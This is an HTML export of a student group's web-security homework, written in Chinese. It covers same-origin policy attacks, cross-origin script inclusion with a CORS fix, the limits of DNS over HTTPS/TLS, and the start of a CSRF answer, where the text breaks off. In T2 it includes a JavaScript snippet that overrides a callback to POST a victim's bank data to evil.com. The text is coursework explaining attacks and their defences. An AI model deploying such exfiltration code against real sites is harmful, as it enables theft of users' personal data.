@@ -1,0 +1,355 @@
+<!DOCTYPE html><html><head>
+      <title>HW3</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\lenovo\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.6.8\node_modules\@shd101wyy\mume\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <style>
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
+ */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
+
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
+}
+
+.token.comment,
+.token.blockquote {
+  color: #969896;
+}
+
+.token.cdata {
+  color: #183691;
+}
+
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
+}
+
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
+}
+
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
+}
+
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
+
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: hsla(24, 20%, 50%,.08);
+  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+
+pre[data-line] .line-highlight:before, 
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: hsla(24, 20%, 50%,.4);
+  color: hsl(24, 20%, 95%);
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p,html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div{display:inline}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  300px/2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({ tex2jax: {inlineMath: [['$', '$']]}, messageStyle: "none" });
+</script>
+<h1 class="mume-header" id="homework-3">Homework 3</h1>
+
+<p>Edited by<br>
+&#x725B;&#x5348;&#x7532; PB20111656<br>
+&#x6F58;&#x4E91;&#x77F3; PB20111657<br>
+&#x77F3;&#x78CA;&#x946B; PB20111658<br>
+&#x5B59;&#x9704;&#x9E4D; PB20111659<br>
+&#x9648;&#xA0;&#xA0;&#xA0;&#xA0;&#x660A; PB20051077</p>
+<h2 class="mume-header" id="t1">T1</h2>
+
+<p>&#x4E24;&#x4E2A;&#x7F51;&#x9875;&#x662F;&#x5426;&#x540C;&#x6E90;&#x7684;&#x5224;&#x65AD;&#x4F9D;&#x636E;&#x662F;&#x4E09;&#x70B9;&#xFF1A;&#x534F;&#x8BAE;&#x3001;&#x57DF;&#x540D;&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x5982;&#x679C;&#x4EC5;&#x4F9D;&#x636E;&#x57DF;&#x540D;&#x5224;&#x65AD;&#x662F;&#x5426;&#x540C;&#x6E90;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5982;&#x4E0B;&#x653B;&#x51FB;&#xFF1A;&#x8003;&#x8651;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x5E0C;&#x671B;&#x901A;&#x8FC7;&#x8F6C;&#x5230;<code>https://bank.example:8080/login</code>&#x767B;&#x5F55;&#x4ED6;&#x4EEC;&#x7684;&#x94F6;&#x884C;&#x5E10;&#x6237;&#x3002;&#x653B;&#x51FB;&#x8005;&#x5EFA;&#x7ACB;&#x7F51;&#x7AD9;<code>http://bank.example:8080</code>&#xFF0C;&#x5982;&#x679C;&#x4EC5;&#x4F9D;&#x636E;&#x57DF;&#x540D;&#x5224;&#x65AD;&#x662F;&#x5426;&#x540C;&#x6E90;&#xFF0C;&#x7F51;&#x7AD9;&#x548C;&#x7528;&#x6237;&#x8981;&#x767B;&#x5F55;&#x7684;&#x7F51;&#x7AD9;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x6765;&#x6E90;&#x3002;&#x7F51;&#x7AD9;<code>http://bank.example:8080</code>&#x7684;&#x552F;&#x4E00;&#x76EE;&#x7684;&#x662F;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7A97;&#x53E3;&#xFF0C;&#x5C06;&#x7528;&#x6237;&#x91CD;&#x5B9A;&#x5411;&#x5230;<code>https://bank.example:8080/login</code>&#x3002;&#x6B64;&#x65F6;&#xFF0C;&#x7528;&#x6237;&#x4F4D;&#x4E8E;&#x5176;&#x94F6;&#x884C;&#x7684;&#x5408;&#x6CD5;&#x767B;&#x5F55;&#x7AD9;&#x70B9;&#xFF0C;&#x5C31;&#x4F1A;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x548C;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x3002;&#x4F46;&#x662F;&#x6309;&#x7167;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;<code>http://bank.example:8080</code>&#x548C;<code>https://bank.example:8080/login</code>&#x540C;&#x6E90;&#xFF0C;&#x524D;&#x8005;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x540E;&#x8005;&#x7684; DOM&#x3002;&#x56E0;&#x6B64;&#x653B;&#x51FB;&#x8005;&#x53EA;&#x9700;&#x8981;&#x5411;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;&#x5B57;&#x6BB5;&#x6DFB;&#x52A0;&#x4FA6;&#x542C;&#x5668;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97;&#x5BF9;&#x7528;&#x6237;&#x94F6;&#x884C;&#x5E10;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x3002;&#x540C;&#x7406;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;&#xFF0C;&#x8FDB;&#x884C;&#x548C;&#x4E0A;&#x8FF0;&#x7C7B;&#x4F3C;&#x7684;&#x653B;&#x51FB;&#x3002;</p>
+<h2 class="mume-header" id="t2">T2</h2>
+
+<p>(a) <code>evil.com</code>&#x7684;&#x9875;&#x9762;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5D4C;&#x5165;&#x4E00;&#x4E2A;<code>&lt;script&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x6307;&#x5411;bank.com&#x7684;<code>userdata.js</code>&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x7F16;&#x5199;<code>displayData</code>&#x51FD;&#x6570;&#x6765;&#x83B7;&#x53D6;John Doe&#x7684;&#x6570;&#x636E;&#x3002;&#x5F53;John Doe&#x767B;&#x5F55;<code>bank.com</code>&#x540E;&#xFF0C;&#x8BBF;&#x95EE;<code>evil.com</code>&#xFF0C;<code>evil.com</code>&#x4FBF;&#x4F1A;&#x52A0;&#x8F7D;<code>bank.com/userdata.js</code>&#x5E76;&#x6267;&#x884C;<code>displayData</code>&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7ED9;<code>evil.com</code></p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token keyword keyword-function">function</span> <span class="token function">displayData</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword keyword-var">var</span> xhr <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span><span class="token method function property-access">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;https://evil.com/steal.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    xhr<span class="token punctuation">.</span><span class="token method function property-access">send</span><span class="token punctuation">(</span><span class="token known-class-name class-name">JSON</span><span class="token punctuation">.</span><span class="token method function property-access">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>//bank.com/userdata.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>(b) &#x53EF;&#x4EE5;&#x4F7F;&#x7528;CORS&#x6765;&#x9650;&#x5236;&#x53EA;&#x6709;<code>bank.com</code>&#x57DF;&#x540D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;<code>userdata.js</code>&#x6587;&#x4EF6;&#xFF0C;&#x4ECE;&#x800C;&#x9632;&#x6B62;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x3002;<br>
+&#x5C06;<code>accountInfo.html</code>&#x7684;(*)&#x884C;&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>//bank.com/userdata.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>anonymous<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>&#x8FD9;&#x6837;&#x4E00;&#x6765;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5C06;&#x542F;&#x7528;CORS&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5728;<code>userdata.js</code>&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x54CD;&#x5E94;&#x5934;&#xFF0C;&#x6307;&#x5B9A;<code>Access-Control-Allow-Origin</code>&#x4E3A;<code>bank.com</code>&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x53EA;&#x6709;&#x6765;&#x81EA;<code>bank.com</code>&#x7684;&#x8BF7;&#x6C42;&#x624D;&#x80FD;&#x8BBF;&#x95EE;<code>userdata.js</code>&#x6587;&#x4EF6;&#xFF0C;&#x5F53;<code>evil.com</code>&#x8BD5;&#x56FE;&#x8BBF;&#x95EE;<code>userdata.js</code>&#x65F6;&#x4F1A;&#x88AB;&#x6D4F;&#x89C8;&#x5668;&#x62D2;&#x7EDD;&#x3002;</p>
+<h2 class="mume-header" id="t3">T3</h2>
+
+<p>(a) &#x53EF;&#x4EE5;&#x9632;&#x5FA1;DNS&#x6B3A;&#x9A97;&#x548C;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#x3002;&#x901A;&#x8FC7;&#x4F7F;&#x7528;HTTPS&#x52A0;&#x5BC6;&#xFF0C;&#x53EF;&#x9632;&#x6B62;&#x672A;&#x7ECF;&#x6388;&#x6743;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x62E6;&#x622A;&#x548C;&#x7BE1;&#x6539;DNS&#x67E5;&#x8BE2;&#x548C;&#x54CD;&#x5E94;&#xFF0C;&#x4ECE;&#x800C;&#x6709;&#x52A9;&#x4E8E;&#x7EF4;&#x62A4;DNS&#x6570;&#x636E;&#x7684;&#x9690;&#x79C1;&#x548C;&#x5B8C;&#x6574;&#x6027;&#x3002;<br>
+(b) &#x65E0;&#x6CD5;&#x9632;&#x5FA1;DNS&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#x653B;&#x51FB;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;HTTPS&#x53EA;&#x80FD;&#x4FDD;&#x62A4;&#x5BA2;&#x6237;&#x7AEF;&#x548C;DNS&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x800C;&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#x662F;&#x5229;&#x7528; DNS &#x670D;&#x52A1;&#x5668;&#x8F6F;&#x4EF6;&#x4E2D;&#x7684;&#x6F0F;&#x6D1E;&#x5C06;&#x865A;&#x5047;&#x7684; DNS &#x8BB0;&#x5F55;&#x63D2;&#x5165;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x662F;&#x9488;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x548C;HTTPS&#x65E0;&#x5173;&#x3002;<br>
+(c) DoH&#x548C;DoT&#x4E0D;&#x80FD;&#x9632;&#x5FA1;DNS&#x88AB;&#x4F5C;&#x4E3A;DDoS&#x653E;&#x5927;&#x5668;&#x4F7F;&#x7528;&#x3002;&#x8FD9;&#x4E9B;&#x534F;&#x8BAE;&#x7684;&#x662F;&#x7528;&#x6765;&#x4FDD;&#x62A4;&#x5BA2;&#x6237;&#x7AEF;&#x548C;DNS&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x8FDE;&#x63A5;&#x7684;&#x3002;&#x653E;&#x5927;&#x653B;&#x51FB;&#x5229;&#x7528;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x4E4B;&#x95F4;&#x7684;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&#x5DEE;&#x5F02;&#xFF0C;&#x5373;&#x4F7F;&#x901A;&#x4FE1;&#x88AB;&#x52A0;&#x5BC6;&#xFF0C;&#x54CD;&#x5E94;&#x6570;&#x636E;&#x5305;&#x4ECD;&#x7136;&#x4F1A;&#x5F88;&#x5927;&#x3002;&#x4F46;&#x662F;&#xFF0C;DoH&#x548C;DoT&#x5BF9;TCP&#x7684;&#x4F9D;&#x8D56;&#x6027;&#x53EF;&#x80FD;&#x4F1A;&#x4F7F;&#x653B;&#x51FB;&#x8005;&#x66F4;&#x96BE;&#x4F2A;&#x9020;IP&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x4F7F;DNS&#x653E;&#x5927;&#x653B;&#x51FB;&#x96BE;&#x4EE5;&#x8FDB;&#x884C;&#x3002;<br>
+(d) DoH&#x548C;DoT&#x4E0D;&#x80FD;&#x9632;&#x5FA1;DNS&#x91CD;&#x7ED1;&#x5B9A;&#x653B;&#x51FB;&#x3002;DNS&#x91CD;&#x7ED1;&#x5B9A;&#x653B;&#x51FB;&#x6D89;&#x53CA;&#x5229;&#x7528;DNS&#x89E3;&#x6790;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x884C;&#x4E3A;&#xFF0C;&#x901A;&#x5E38;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x548C;DNS&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x65E0;&#x5173;&#xFF0C;&#x800C;DoH&#x548C;DoT&#x63D0;&#x4F9B;&#x7684;&#x52A0;&#x5BC6;&#x901A;&#x4FE1;&#x53EA;&#x80FD;&#x4FDD;&#x62A4;&#x5BA2;&#x6237;&#x7AEF;&#x548C;DNS&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;</p>
+<h2 class="mume-header" id="t4">T4</h2>
+
+<p>(a) CSRF &#x653B;&#x51FB;&#x662F;&#x4E00;&#x79CD;&#x9488;&#x5BF9;&#x4F9D;&#x8D56;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x548C;&#x6743;&#x9650;&#x6267;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x7F51;&#x7AD9;&#x7684;&#x7F51;&#x7EDC;&#x6F0F;&#x6D1E;&#x3002;&#x5728; CSRF &#x653B;&#x51FB;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x8BF1;&#x4F7F;&#x53D7;&#x5BB3;&#x8005;&#x5728;&#x76EE;&#x6807;&#x7F51;&#x7AD9;&#x4E0A;&#x6267;&#x884C;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x975E;&#x6CD5;&#x64CD;&#x4F5C;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x7528;&#x6237;&#x767B;&#x5F55;<code>https://example.com/login</code>&#xFF0C;&#x5728;&#x901A;&#x8FC7;&#x4E86;&#x7F51;&#x7AD9;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x4E4B;&#x540E;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x5B9E;&#x65F6;&#x4F1A;&#x8BDD;&#x7684; cookie&#x3002;&#x5047;&#x8BBE;&#x73B0;&#x5728;&#x7528;&#x6237;&#x65E0;&#x610F;&#x95F4;&#x8BBF;&#x95EE;&#x653B;&#x51FB;&#x8005;&#x63A7;&#x5236;&#x7684;&#x6076;&#x610F;&#x7F51;&#x7AD9;<code>https://evil.com</code>&#xFF0C;&#x8BE5;&#x6076;&#x610F;&#x7F51;&#x7AD9;&#x53EF;&#x80FD;&#x5305;&#x542B;&#x4E00;&#x6BB5;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684; HTML &#x6216; JavaScript 